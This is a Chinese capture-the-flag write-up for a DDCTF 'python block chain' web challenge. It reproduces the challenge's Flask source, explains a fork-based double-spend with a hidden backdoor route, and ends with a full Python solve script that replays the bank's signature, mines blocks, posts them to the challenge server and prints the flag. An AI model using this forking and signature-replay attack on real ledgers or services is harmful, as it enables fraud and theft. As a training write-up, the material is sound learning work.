# Web_python_block_chain

[题目地址](https://adworld.xctf.org.cn/challenges/details?hash=66608b7c-3eca-4497-bf8a-d55068a17843_2)

目前唯一一道我觉得8分还给少了的题。虽然可能对之前接触过区块链的大佬们来说没那么难，但是我真的是区块链纯萌新啊，真的长见识了。推荐区块链入门[视频](https://www.youtube.com/watch?v=bBC-nXj3Ng4)，是看过的入门教程里讲的最清楚的，时间也不是很长。

之前没见过区块链的我进来就懵了。

```json
hash of genesis block: 8cfb0301000286c266a3d29d78c498ade17556412afcf7135e842ffa127d735f
the bank's addr: 8f6eb934cceca2dede3b315f04d0f445c518f29a02cce8f3656b9fb0a75eed62a2ac4dd13866a6b6d87ca89b0d9ae9bd, 
the hacker's addr: f7a1e95baf45e7d0a0f636b5fc786b5c3e9056a7a3092225edd017baf1768afedc484f6b6ffc1f90971d87c459a4a4ef, 
the shop's addr: ab87c82cff6cf5233aba04d83a12cbc77a6540e5715506a087b9a193e4f11679da75076335210c93b1e64486d6535221
Balance of all addresses: {  "ab87c82cff6cf5233aba04d83a12cbc77a6540e5715506a087b9a193e4f11679da75076335210c93b1e64486d6535221": 0,   "8f6eb934cceca2dede3b315f04d0f445c518f29a02cce8f3656b9fb0a75eed62a2ac4dd13866a6b6d87ca89b0d9ae9bd": 1,   "f7a1e95baf45e7d0a0f636b5fc786b5c3e9056a7a3092225edd017baf1768afedc484f6b6ffc1f90971d87c459a4a4ef": 999999
  }
All utxos: {
  "77d972a7-cc90-439a-bc77-594744c89ee7": {
    "amount": 999999, 
    "hash": "3ff39c9b8b306f9c1bf0787911bf47ebd28d60c2fbe17904b1e51c3980c0cc3a", 
    "addr": "f7a1e95baf45e7d0a0f636b5fc786b5c3e9056a7a3092225edd017baf1768afedc484f6b6ffc1f90971d87c459a4a4ef", 
    "id": "77d972a7-cc90-439a-bc77-594744c89ee7"
    }, 
  "ef68b7d9-4f69-40a5-a90c-f6fefdf5e635": {
    "amount": 1, 
    "hash": "c711176969c028d475e412e52995df80fe9b10ea1f13962a0e4ef78caf63453b", 
    "addr": "8f6eb934cceca2dede3b315f04d0f445c518f29a02cce8f3656b9fb0a75eed62a2ac4dd13866a6b6d87ca89b0d9ae9bd", 
    "id": "ef68b7d9-4f69-40a5-a90c-f6fefdf5e635"
    }
  }
Blockchain Explorer: {
  "4aecfdc138e39e386cf2aad65bd950d59a742121cf874ff1cb8c036a87816980": {
    "nonce": "HAHA, I AM THE BANK NOW!",
    "prev": "8cfb0301000286c266a3d29d78c498ade17556412afcf7135e842ffa127d735f", 
    "hash": "4aecfdc138e39e386cf2aad65bd950d59a742121cf874ff1cb8c036a87816980", 
    "transactions": [{
      "input": ["79172010-b080-4ad9-b8b2-ba72c232da20"], 
      "signature": ["2afcf49a14934bb070b10aa687e3a209c55bacbe318e30300234779e837f012ec97de502872ab058f1070614ec4fd87b"], 
      "hash": "ce7a7f0a48cc3cc9266227726ce7b7c9fcd90734f86c765f9a24b2040f1bdc9e", 
     "output": [{"amount": 999999, "hash": "3ff39c9b8b306f9c1bf0787911bf47ebd28d60c2fbe17904b1e51c3980c0cc3a", 
      "addr": "f7a1e95baf45e7d0a0f636b5fc786b5c3e9056a7a3092225edd017baf1768afedc484f6b6ffc1f90971d87c459a4a4ef", 
      "id": "77d972a7-cc90-439a-bc77-594744c89ee7"
      }, {
      "amount": 1, 
      "hash": "c711176969c028d475e412e52995df80fe9b10ea1f13962a0e4ef78caf63453b", 
      "addr": "8f6eb934cceca2dede3b315f04d0f445c518f29a02cce8f3656b9fb0a75eed62a2ac4dd13866a6b6d87ca89b0d9ae9bd", 
      "id": "ef68b7d9-4f69-40a5-a90c-f6fefdf5e635"
      }]
    }], 
    "height": 1
  }, 
  "8cfb0301000286c266a3d29d78c498ade17556412afcf7135e842ffa127d735f": {
    "nonce": "The Times 03/Jan/2009 Chancellor on brink of second bailout for bank", 
    "prev": "0000000000000000000000000000000000000000000000000000000000000000", 
    "hash": "8cfb0301000286c266a3d29d78c498ade17556412afcf7135e842ffa127d735f", 
    "transactions": [{
      "input": [], 
      "signature": [], 
      "hash": "f95a2030b476c14e790b1b5560aa158111cf06d891d04c6cd942bd2b273201a1", 
      "output": [{
        "amount": 1000000, 
        "hash": "d5e5cd514d2b5cf6cccb19d2253f115c39e8e71ea0f5cc1f9dc259219ecf3f82", 
        "addr": "8f6eb934cceca2dede3b315f04d0f445c518f29a02cce8f3656b9fb0a75eed62a2ac4dd13866a6b6d87ca89b0d9ae9bd", 
        "id": "79172010-b080-4ad9-b8b2-ba72c232da20"
        }]
      }], 
      "height": 0
    }, 
    "b47ac88e263795044afb5f92e62cc8fc659def91c158de5c13d70b6e127c8074": {
      "nonce": "a empty block", 
      "prev": "4aecfdc138e39e386cf2aad65bd950d59a742121cf874ff1cb8c036a87816980", 
      "hash": "b47ac88e263795044afb5f92e62cc8fc659def91c158de5c13d70b6e127c8074", 
      "transactions": [], 
      "height": 2
    }
  }
```

json数据，然而光看这些东西啥也看不出来。页面还有个view source，看下是什么。


```python
# -*- encoding: utf-8 -*-
# written in python 2.7
__author__ = 'garzon'

import hashlib, json, rsa, uuid, os
from flask import Flask, session, redirect, url_for, escape, request
from pycallgraph import PyCallGraph  
from pycallgraph import Config  
from pycallgraph.output import GraphvizOutput 

app = Flask(__name__)
app.secret_key = '*********************'
url_prefix = ''

def FLAG():
    return 'Here is your flag: DDCTF{******************}'

def hash(x):
    return hashlib.sha256(hashlib.md5(x).digest()).hexdigest()
    
def hash_reducer(x, y):
    return hash(hash(x)+hash(y))
    
def has_attrs(d, attrs):
    if type(d) != type({}): raise Exception("Input should be a dict/JSON")
    for attr in attrs:
        if attr not in d:
            raise Exception("{} should be presented in the input".format(attr))

EMPTY_HASH = '0'*64

def addr_to_pubkey(address):
    return rsa.PublicKey(int(address, 16), 65537)
    
def pubkey_to_address(pubkey):
    assert pubkey.e == 65537
    hexed = hex(pubkey.n)
    if hexed.endswith('L'): hexed = hexed[:-1]
    if hexed.startswith('0x'): hexed = hexed[2:]
    return hexed
    
def gen_addr_key_pair():
    pubkey, privkey = rsa.newkeys(384)
    return pubkey_to_address(pubkey), privkey

bank_address, bank_privkey = gen_addr_key_pair()
hacker_address, hacker_privkey = gen_addr_key_pair()
shop_address, shop_privkey = gen_addr_key_pair()
shop_wallet_address, shop_wallet_privkey = gen_addr_key_pair()

def sign_input_utxo(input_utxo_id, privkey):
    return rsa.sign(input_utxo_id, privkey, 'SHA-1').encode('hex')
    
def hash_utxo(utxo):
    return reduce(hash_reducer, [utxo['id'], utxo['addr'], str(utxo['amount'])])
    
def create_output_utxo(addr_to, amount):
    utxo = {'id': str(uuid.uuid4()), 'addr': addr_to, 'amount': amount}
    utxo['hash'] = hash_utxo(utxo)
    return utxo
    
def hash_tx(tx):
    return reduce(hash_reducer, [
        reduce(hash_reducer, tx['input'], EMPTY_HASH),
        reduce(hash_reducer, [utxo['hash'] for utxo in tx['output']], EMPTY_HASH)
    ])
    
def create_tx(input_utxo_ids, output_utxo, privkey_from=None):
    tx = {'input': input_utxo_ids, 'signature': [sign_input_utxo(id, privkey_from) for id in input_utxo_ids], 'output': output_utxo}
    tx['hash'] = hash_tx(tx)
    return tx
    
def hash_block(block):
    return reduce(hash_reducer, [block['prev'], block['nonce'], reduce(hash_reducer, [tx['hash'] for tx in block['transactions']], EMPTY_HASH)])
    
def create_block(prev_block_hash, nonce_str, transactions):
    if type(prev_block_hash) != type(''): raise Exception('prev_block_hash should be hex-encoded hash value')
    nonce = str(nonce_str)
    if len(nonce) > 128: raise Exception('the nonce is too long')
    block = {'prev': prev_block_hash, 'nonce': nonce, 'transactions': transactions}
    block['hash'] = hash_block(block)
    return block
    
def find_blockchain_tail():
    return max(session['blocks'].values(), key=lambda block: block['height'])
    
def calculate_utxo(blockchain_tail):
    curr_block = blockchain_tail
    blockchain = [curr_block]
    while curr_block['hash'] != session['genesis_block_hash']:
        curr_block = session['blocks'][curr_block['prev']]
        blockchain.append(curr_block)
    blockchain = blockchain[::-1]
    utxos = {}
    for block in blockchain:
        for tx in block['transactions']:
            for input_utxo_id in tx['input']:
                del utxos[input_utxo_id]
            for utxo in tx['output']:
                utxos[utxo['id']] = utxo
    return utxos
        
def calculate_balance(utxos):
    balance = {bank_address: 0, hacker_address: 0, shop_address: 0}
    for utxo in utxos.values():
        if utxo['addr'] not in balance:
            balance[utxo['addr']] = 0
        balance[utxo['addr']] += utxo['amount']
    return balance

def verify_utxo_signature(address, utxo_id, signature):
    try:
        return rsa.verify(utxo_id, signature.decode('hex'), addr_to_pubkey(address))
    except:
        return False

def append_block(block, difficulty=int('f'*64, 16)):
    has_attrs(block, ['prev', 'nonce', 'transactions'])
    
    if type(block['prev']) == type(u''): block['prev'] = str(block['prev'])
    if type(block['nonce']) == type(u''): block['nonce'] = str(block['nonce'])
    if block['prev'] not in session['blocks']: raise Exception("unknown parent block")
    tail = session['blocks'][block['prev']]
    utxos = calculate_utxo(tail)
    
    if type(block['transactions']) != type([]): raise Exception('Please put a transaction array in the block')
    new_utxo_ids = set()
    for tx in block['transactions']:
        has_attrs(tx, ['input', 'output', 'signature'])
        
        for utxo in tx['output']:
            has_attrs(utxo, ['amount', 'addr', 'id'])
            if type(utxo['id']) == type(u''): utxo['id'] = str(utxo['id'])
            if type(utxo['addr']) == type(u''): utxo['addr'] = str(utxo['addr'])
            if type(utxo['id']) != type(''): raise Exception("unknown type of id of output utxo")
            if utxo['id'] in new_utxo_ids: raise Exception("output utxo of same id({}) already exists.".format(utxo['id']))
            new_utxo_ids.add(utxo['id'])
            if type(utxo['amount']) != type(1): raise Exception("unknown type of amount of output utxo")
            if utxo['amount'] <= 0: raise Exception("invalid amount of output utxo")
            if type(utxo['addr']) != type(''): raise Exception("unknown type of address of output utxo")
            try:
                addr_to_pubkey(utxo['addr'])
            except:
                raise Exception("invalid type of address({})".format(utxo['addr']))
            utxo['hash'] = hash_utxo(utxo)
        tot_output = sum([utxo['amount'] for utxo in tx['output']])
        
        if type(tx['input']) != type([]): raise Exception("type of input utxo ids in tx should be array")
        if type(tx['signature']) != type([]): raise Exception("type of input utxo signatures in tx should be array")
        if len(tx['input']) != len(tx['signature']): raise Exception("lengths of arrays of ids and signatures of input utxos should be the same")
        tot_input = 0
        tx['input'] = [str(i) if type(i) == type(u'') else i for i in tx['input']]
        tx['signature'] = [str(i) if type(i) == type(u'') else i for i in tx['signature']]
        for utxo_id, signature in zip(tx['input'], tx['signature']):
            if type(utxo_id) != type(''): raise Exception("unknown type of id of input utxo")
            if utxo_id not in utxos: raise Exception("invalid id of input utxo. Input utxo({}) does not exist or it has been consumed.".format(utxo_id))
            utxo = utxos[utxo_id]
            if type(signature) != type(''): raise Exception("unknown type of signature of input utxo")
            if not verify_utxo_signature(utxo['addr'], utxo_id, signature):
                raise Exception("Signature of input utxo is not valid. You are not the owner of this input utxo({})!".format(utxo_id))
            tot_input += utxo['amount']
            del utxos[utxo_id]
        if tot_output > tot_input:
            raise Exception("You don't have enough amount of DDCoins in the input utxo! {}/{}".format(tot_input, tot_output))
        tx['hash'] = hash_tx(tx)
    
    block = create_block(block['prev'], block['nonce'], block['transactions'])
    block_hash = int(block['hash'], 16)
    if block_hash > difficulty: raise Exception('Please provide a valid Proof-of-Work')
    block['height'] = tail['height']+1
    if len(session['blocks']) > 50: raise Exception('The blockchain is too long. Use ./reset to reset the blockchain')
    if block['hash'] in session['blocks']: raise Exception('A same block is already in the blockchain')
    session['blocks'][block['hash']] = block
    session.modified = True
    
def init():
    if 'blocks' not in session:
        session['blocks'] = {}
        session['your_diamonds'] = 0
        # First, the bank issued some DDCoins ...
        total_currency_issued = create_output_utxo(bank_address, 1000000)
        genesis_transaction = create_tx([], [total_currency_issued]) # create DDCoins from nothing
        genesis_block = create_block(EMPTY_HASH, 'The Times 03/Jan/2009 Chancellor on brink of second bailout for bank', [genesis_transaction])
        session['genesis_block_hash'] = genesis_block['hash']
        genesis_block['height'] = 0
        session['blocks'][genesis_block['hash']] = genesis_block
    
        # Then, the bank was hacked by the hacker ...
        handout = create_output_utxo(hacker_address, 999999)
        reserved = create_output_utxo(bank_address, 1)
        transferred = create_tx([total_currency_issued['id']], [handout, reserved], bank_privkey)
        second_block = create_block(genesis_block['hash'], 'HAHA, I AM THE BANK NOW!', [transferred])
        append_block(second_block)
    
        # Can you buy 2 diamonds using all DDCoins?
        third_block = create_block(second_block['hash'], 'a empty block', [])
        append_block(third_block)
        
def get_balance_of_all():
    init()
    tail = find_blockchain_tail()
    utxos = calculate_utxo(tail)
    return calculate_balance(utxos), utxos, tail
    
@app.route(url_prefix+'/')
def homepage():
    announcement = 'Announcement: The server has been restarted at 21:45 04/17. All blockchain have been reset. '
    balance, utxos, _ = get_balance_of_all()
    genesis_block_info = 'hash of genesis block: ' + session['genesis_block_hash']
    addr_info = 'the bank\'s addr: ' + bank_address + ', the hacker\'s addr: ' + hacker_address + ', the shop\'s addr: ' + shop_address
    balance_info = 'Balance of all addresses: ' + json.dumps(balance)
    utxo_info = 'All utxos: ' + json.dumps(utxos)
    blockchain_info = 'Blockchain Explorer: ' + json.dumps(session['blocks'])
    view_source_code_link = "<a href='source_code'>View source code</a>"
    return announcement+('<br /><br />\r\n\r\n'.join([view_source_code_link, genesis_block_info, addr_info, balance_info, utxo_info, blockchain_info]))
    
    
@app.route(url_prefix+'/flag')
def getFlag():
    init()
    if session['your_diamonds'] >= 2: return FLAG()
    return 'To get the flag, you should buy 2 diamonds from the shop. You have {} diamonds now. To buy a diamond, transfer 1000000 DDCoins to '.format(session['your_diamonds']) + shop_address
    
def find_enough_utxos(utxos, addr_from, amount):
    collected = []
    for utxo in utxos.values():
        if utxo['addr'] == addr_from:
            amount -= utxo['amount']
            collected.append(utxo['id'])
        if amount <= 0: return collected, -amount
    raise Exception('no enough DDCoins in ' + addr_from)
    
def transfer(utxos, addr_from, addr_to, amount, privkey):
    input_utxo_ids, the_change = find_enough_utxos(utxos, addr_from, amount)
    outputs = [create_output_utxo(addr_to, amount)]
    if the_change != 0:
        outputs.append(create_output_utxo(addr_from, the_change))
    return create_tx(input_utxo_ids, outputs, privkey)
    
@app.route(url_prefix+'/5ecr3t_free_D1diCoin_b@ckD00r/<string:address>')
def free_ddcoin(address):
    balance, utxos, tail = get_balance_of_all()
    if balance[bank_address] == 0: return 'The bank has no money now.'
    try:
        address = str(address)
        addr_to_pubkey(address) # to check if it is a valid address
        transferred = transfer(utxos, bank_address, address, balance[bank_address], bank_privkey)
        new_block = create_block(tail['hash'], 'b@cKd00R tr1993ReD', [transferred])
        append_block(new_block)
        return str(balance[bank_address]) + ' DDCoins are successfully sent to ' + address
    except Exception, e:
        return 'ERROR: ' + str(e)

DIFFICULTY = int('00000' + 'f' * 59, 16)
@app.route(url_prefix+'/create_transaction', methods=['POST'])
def create_tx_and_check_shop_balance():
    init()
    try:
        block = json.loads(request.data)
        append_block(block, DIFFICULTY)
        msg = 'transaction finished.'
    except Exception, e:
        return str(e)
        
    balance, utxos, tail = get_balance_of_all()
    if balance[shop_address] == 1000000:
        # when 1000000 DDCoins are received, the shop will give you a diamond
        session['your_diamonds'] += 1
        # and immediately the shop will store the money somewhere safe.
        transferred = transfer(utxos, shop_address, shop_wallet_address, balance[shop_address], shop_privkey)
        new_block = create_block(tail['hash'], 'save the DDCoins in a cold wallet', [transferred])
        append_block(new_block)
        msg += ' You receive a diamond.'
    return msg
    
        
# if you mess up the blockchain, use this to reset the blockchain.
@app.route(url_prefix+'/reset')
def reset_blockchain():
    if 'blocks' in session: del session['blocks']
    if 'genesis_block_hash' in session: del session['genesis_block_hash']
    return 'reset.'
    
@app.route(url_prefix+'/source_code')
def show_source_code():
    source = open('serve.py', 'r')
    html = ''
    for line in source:
        html += line.replace('&','&amp;').replace('\t', '&nbsp;'*4).replace(' ','&nbsp;').replace('<', '&lt;').replace('>','&gt;').replace('\n', '<br />')
    source.close()
    return html
    
if __name__ == '__main__':
    app.run(debug=False, host='0.0.0.0')
```

震惊我一整年。这个代码量杀人啊……来吧，剖析[wp](https://xuanxuanblingbling.github.io/ctf/web/2018/05/01/DDCTF2018-WEB4-%E5%8C%BA%E5%9D%97%E9%93%BE/)。这个wp已经是网上最好的了。

flask框架，看一下几个非根路径。

- /flag：flag界面，要求钻石数量等于2。一个钻石1000000 DDCoins，在商店买。
- /5ecr3t_free_D1diCoin_b@ckD00r/<string:address>:往路径后的地址转账银行中目前有的所有DDCoins。
- /create_transaction：发起转账。
- /reset：如果解题时把区块链搞坏了，reset恢复初始的区块链。
  
函数的分析可以去去上面的wp看，写的绝对比我好。此处就是记录个人对双花攻击的理解。（一定要去看上面那个视频啊，解答了我很多疑惑）区块链与平时熟悉的交易系统不同，没有专门的认证机构，也没有中间商，每个人都管理着区块链的副本，区块链本身记录了交易内容，也可以是空的。初始区块链为创世块（就是第一个块）->黑客块->空块。注意上面的json没有按照顺序来。题目要求把黑客的钱追回来（攻防世界少给了题目描述和提示），可是钱已经被转走了，有什么办法呢？

区块链靠计算力证明（proof of work）保证转账的正确性。这个计算力证明简单理解就是哪个区块链更长就信谁的。由此，我们可以从创世块做一个分支，放几个空块，只要这个分支比原来黑客的分支长了，钱就回来了，因为转账走的那个分支无效了。bank的钱回来了，正好可以用后门转给自己然后买1颗钻石。我们继续在买钻石那个块做分支，又来几个比之前长的块，那买钻石转走的钱又无效了，回到了bank里。但是买了的钻石没有消失，因为是用session记录的，源代码里没有涉及到session的改变。那钱回来了不久又可以后门拿钱了吗？第二颗钻石到手。

还有不用后门的方法，原理和第一种差不多就不赘述了。最开始觉得这题超级难，但是看了视频后发现简直太好理解了。可惜代码审计还是我过不去的坎。

```python
# -*- encoding: utf-8 -*-
# written in python 2.7
import hashlib, json, rsa, uuid, os,requests,re

# 一堆变量常量

url_root="http://116.85.48.107:5000/b9744af30897e/"
url_create="http://116.85.48.107:5000/b9744af30897e/create_transaction"
url_flag="http://116.85.48.107:5000/b9744af30897e/flag"

s=requests.Session()
ddcoin = s.get(url=url_root)

prev_one=re.search(r"hash of genesis block: ([0-9a-f]{64})",ddcoin.content, flags=0).group(1)
bank_utox_id=re.search(r"\"input\": \[\"([0-9a-f\-]{36})",ddcoin.content, flags=0).group(1)
bank_signature=re.search(r"\"signature\": \[\"([0-9a-f]{96})",ddcoin.content, flags=0).group(1)

DIFFICULTY = int('00000' + 'f' * 59, 16)
EMPTY_HASH = '0'*64

bank_addr="b2b69bf382659fd193d40f3905eda4cb91a2af16d719b6f9b74b3a20ad7a19e4de41e5b7e78c8efd60a32f9701a13985"
hacke_addr="955c823ea45e97e128bd2c64d139b3625afb3b19c37da9972548f3d28ed584b24f5ea49a17ecbe60e9a0a717b834b131"
shop_addr="b81ff6d961082076f3801190a731958aec88053e8191258b0ad9399eeecd8306924d2d2a047b5ec1ed8332bf7a53e735"

# 源码中的API

def hash(x):
    return hashlib.sha256(hashlib.md5(x).digest()).hexdigest()
    
def hash_reducer(x, y):
    return hash(hash(x)+hash(y))

def hash_block(block):
    return reduce(hash_reducer, [block['prev'], block['nonce'], reduce(hash_reducer, [tx['hash'] for tx in block['transactions']], EMPTY_HASH)])

def hash_utxo(utxo):
    return reduce(hash_reducer, [utxo['id'], utxo['addr'], str(utxo['amount'])])

def hash_tx(tx):
    return reduce(hash_reducer, [
        reduce(hash_reducer, tx['input'], EMPTY_HASH),
        reduce(hash_reducer, [utxo['hash'] for utxo in tx['output']], EMPTY_HASH)
    ])

def create_output_utxo(addr_to, amount):
    utxo = {'id': str(uuid.uuid4()), 'addr': addr_to, 'amount': amount}
    utxo['hash'] = hash_utxo(utxo)
    return utxo
    
def create_tx(input_utxo_ids, output_utxo, privkey_from=None):
    tx = {'input': input_utxo_ids, 'signature':[bank_signature], 'output': output_utxo}  # 修改了签名
    tx['hash'] = hash_tx(tx)
    return tx
    
def create_block(prev_block_hash, nonce_str, transactions):
    if type(prev_block_hash) != type(''): raise Exception('prev_block_hash should be hex-encoded hash value')
    nonce = str(nonce_str)
    if len(nonce) > 128: raise Exception('the nonce is too long')
    block = {'prev': prev_block_hash, 'nonce': nonce, 'transactions': transactions}
    block['hash'] = hash_block(block)
    return block


# 构造的方法

def check_hash(prev,tx):
    for i in range(10000000):
        current_block=create_block(prev,str(i),tx)
        block_hash = int(current_block['hash'], 16)
        if block_hash<DIFFICULTY:
            print json.dumps(current_block)
            return current_block

def create_feak_one():
    utxo_first=create_output_utxo(shop_addr,1000000)
    tx_first=create_tx([bank_utox_id],[utxo_first])
    return check_hash(prev_one,[tx_first])

def create_empty_block(prev):
    return check_hash(prev,[])


# 攻击过程

a=create_feak_one()
print s.post(url=url_create,data=str(json.dumps(a))).content
b=create_empty_block(a['hash'])
print s.post(url=url_create,data=str(json.dumps(b))).content
c=create_empty_block(b['hash'])
print s.post(url=url_create,data=str(json.dumps(c))).content
d=create_empty_block(c['hash'])
print s.post(url=url_create,data=str(json.dumps(d))).content
e=create_empty_block(d['hash'])
print s.post(url=url_create,data=str(json.dumps(e))).content
print s.get(url=url_flag).content
```

python2，我装了python2就直接运行了。其实好像改几个print语句就行了。

- ### Flag
  > ctf{922a488e-f243-4b09-ae2d-fa2725da79ea}